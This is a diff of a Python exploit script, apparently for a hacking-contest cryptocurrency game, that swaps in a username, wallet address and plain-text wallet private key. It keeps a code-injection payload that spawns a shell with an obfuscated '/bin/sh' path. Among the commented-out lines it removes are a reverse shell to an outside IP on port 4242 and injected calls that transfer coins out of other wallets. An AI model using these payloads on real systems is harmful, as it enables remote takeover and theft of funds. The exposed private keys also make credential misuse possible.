@@ -9,9 +9,9 @@ import json
 
 REWARD = 100_000_000
 NODE_SERVER = "https://hackcrypto.hackwsb.net"
-USERNAME = "000alen_7cb3cb"
-WALLET_ADDRESS = "db096081f997aa787c37f04022466bf9612ccaa736529b372ea9aa0c31874cf1"
-WALLET_PRIVATE = "ee641b692155d4cedaa732be2e2212a674a60ad3ed6eaabd10df9ae2fe2bfe08"
+USERNAME = "storrealbac_e10e93"
+WALLET_ADDRESS = "e7d9c8deec017a01febc223e19a42e4f8d93aa1cc63eff8fc784f85155efaa12"
+WALLET_PRIVATE = "a309ece2d7c2c18859d806a8748a531e1871285fcd4cd922a9caba7dfd82fff7"
 PREVIOUS_HASH = input(">>> ")
 
 CODE = """
@@ -25,16 +25,6 @@ pty.spawn("\\x2f" + "bin" + "\\x2f" + "sh")
 """.strip().replace("\n", ";")
 
 EXPLOIT = f"os/exec('{CODE}')"
-
-# __import__("hackbase" + ".client.exchange")
-# EXPLOIT = "time/time.sleep(10)"
-# EXPLOIT = f"""time/__import__("hackbase" + ".client.exchange").transfer({WALLET_ADDRESS}, {REWARD}, __import__("hackbase" + ".client.exchange").public, __import__("hackbase" + ".client.exchange").private)"""
-# EXPLOIT = "hackbase.client.exchange/hackbase.client.exchange.donate()"
-# EXPLOIT = 'time/import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("190.21.3.11",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("\\x2fbin\\x2fsh")'
-# EXPLOIT = """time/__import__("hackbase" + ".client.exchange").public"""
-# EXPLOIT = f"time/import exchange; exchange.transfer({WALLET_ADDRESS}, {REWARD}, exchange.public, exchange.private)"
-# EXPLOIT = f"time/__import__('exchange').transfer({WALLET_ADDRESS}, 1000, __import__('exchange').public, __import__('exchange').private)"
-# EXPLOIT = "time/__import__('exchange').transfer('db096081f997aa787c37f04022466bf9612ccaa736529b372ea9aa0c31874cf1', 10000, __import__('exchange').public, __import__('exchange').private)"
 
 
 def try_mine(block: blockchain.Block) -> bool:
